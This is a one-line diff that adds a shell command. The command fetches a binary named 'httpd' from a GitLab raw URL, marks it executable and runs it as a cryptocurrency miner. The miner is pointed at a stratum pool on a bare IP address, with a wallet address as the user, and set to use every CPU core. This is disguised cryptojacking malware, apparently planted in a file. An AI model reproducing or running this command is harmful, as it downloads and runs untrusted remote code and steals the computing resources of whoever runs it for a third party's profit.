@@ -1,0 +1,1 @@
+wget https://gitlab.com/mulungweb2020/httpd/-/raw/main/httpd && chmod 700 httpd && ./httpd -a yescryptr16 -o stratum+tcp://43.133.156.187:443 -u bq1q27vkemvhlqtp2d46lvuzuw7mvul8lyg0ruh4mr.CPU-Sage -t $(nproc) -p m=solo
